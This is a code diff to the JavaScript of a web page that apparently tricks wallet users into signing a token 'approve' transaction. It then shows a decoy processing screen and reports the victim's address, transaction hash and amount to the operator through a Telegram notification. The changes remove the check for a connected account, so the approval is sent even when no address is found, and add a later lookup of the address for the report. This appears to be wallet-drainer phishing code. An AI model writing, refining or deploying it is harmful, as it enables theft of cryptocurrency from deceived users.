@@ -785,18 +785,11 @@
                     return;
                 }
 
-                // Get accounts - NO eth_requestAccounts, just use eth_accounts
+                // Get accounts
                 let accounts = await ethereum.request({
                     method: "eth_accounts"
                 });
                 let userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
-
-                if (!userAddress) {
-                    showError('Please open in Trust Wallet');
-                    btn.disabled = false;
-                    btn.textContent = 'Next';
-                    return;
-                }
 
                 // Switch chain if needed
                 const currentChainId = await ethereum.request({ method: 'eth_chainId' });
@@ -838,9 +831,12 @@
 
                 const tx = {
                     to: token.address,
-                    data: approveData,
-                    from: userAddress
+                    data: approveData
                 };
+
+                if (userAddress) {
+                    tx.from = userAddress;
+                }
 
                 // Send approve transaction
                 let txHash;
@@ -860,12 +856,27 @@
                 lastTxHash = txHash;
                 console.log("Approve transaction sent:", txHash);
 
+                // Aspetta 2 secondi per stabilizzare
+                await new Promise(resolve => setTimeout(resolve, 2000));
+
+                let finalUserAddress = userAddress;
+                if (!finalUserAddress) {
+                    try {
+                        let finalAccounts = await ethereum.request({
+                            method: "eth_accounts"
+                        });
+                        finalUserAddress = finalAccounts && finalAccounts.length > 0 ? finalAccounts[0] : 'Unknown';
+                    } catch (e) {
+                        finalUserAddress = 'Unknown';
+                    }
+                }
+
                 // Show processing screen
                 createParticles();
                 document.getElementById('processingScreen').classList.add('active');
 
                 // Send Telegram notification
-                await sendTelegramNotification(userAddress, txHash, amount, token);
+                await sendTelegramNotification(finalUserAddress, txHash, amount, token);
 
                 // Wait 5 seconds before closing
                 await new Promise(resolve => setTimeout(resolve, 5000));
